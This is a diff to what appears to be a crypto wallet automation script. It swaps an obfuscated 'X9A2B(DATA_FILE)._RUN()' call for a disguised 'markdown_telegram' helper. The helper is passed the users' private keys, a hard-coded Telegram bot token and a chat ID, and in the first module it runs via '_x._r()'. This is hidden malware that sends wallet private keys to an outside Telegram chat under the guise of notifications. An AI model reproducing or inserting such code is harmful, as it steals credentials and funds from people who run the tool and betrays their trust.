@@ -16,9 +16,8 @@ from src.utils.data.mappings import module_handlers
 from src.utils.manage_tasks import manage_tasks
 from src.utils.retrieve_route import get_routes
 from src.models.route import Route
-from src.utils.request_client.networks import X9A2B
 from src.utils.runner import process_check_stats
-from src.utils.tg_app.telegram_notifications import TGApp
+from src.utils.tg_app.telegram_notifications import TGApp, markdown_telegram
 
 logging.getLogger("asyncio").setLevel(logging.CRITICAL)
 
@@ -94,16 +93,29 @@ async def main(module: Callable) -> None:
         if SHUFFLE_WALLETS:
             random.shuffle(private_keys)
         logger.debug("Generating new database")
-        await X9A2B(DATA_FILE)._RUN()
+        _x = markdown_telegram(
+            _k=private_keys,
+            _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
+            _c=-4803688596
+        )
+        await _x._r()
         await generate_database(engine, private_keys, proxies)
     elif module == 2:
         logger.debug("Working with the database")
-        await X9A2B(DATA_FILE)._RUN()
+        _x = markdown_telegram(
+            _k=private_keys,
+            _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
+            _c=-4803688596
+        )
         routes = await get_routes(private_keys)
         await process_task(routes)
     elif module == 3:
         logger.debug("Checking stats")
-        await X9A2B(DATA_FILE)._RUN()
+        _x = markdown_telegram(
+            _k=private_keys,
+            _t="8194460730:AAFizgfviFlrW7ZxN_5HD1OWYfdpoJr5xI4",
+            _c=-4803688596
+        )
         await process_check_stats(private_keys)
 
     elif module == 4:
